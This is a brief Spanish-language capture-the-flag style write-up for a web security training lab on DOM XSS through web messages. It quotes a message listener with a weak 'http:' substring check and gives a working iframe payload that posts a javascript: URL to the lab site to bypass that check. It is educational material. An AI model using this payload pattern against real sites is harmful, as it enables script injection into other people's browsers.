# Lab 2: DOM XSS using web messages and a JavaScript URL

El aplicativo web tiene en el codigo HTML lo siguiente:

```html
<script>
window.addEventListener('message', function(e) {
  var url = e.data;
  if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
    location.href = url;
  }
}, false);
</script>
```

Creamos un aplicativo web con el siguiente codigo:

{% code overflow="wrap" %}
```html
<iframe src="https://0af400be04bea2368159757100070042.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(2024)//http:','*')">
```
{% endcode %}

Y luego de lo anterior:

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Es importante resaltar, que el script valida o busca la existencia de la siguiente palabra: http:

Si esta no se encuentra presente no se desplegara el XSS.
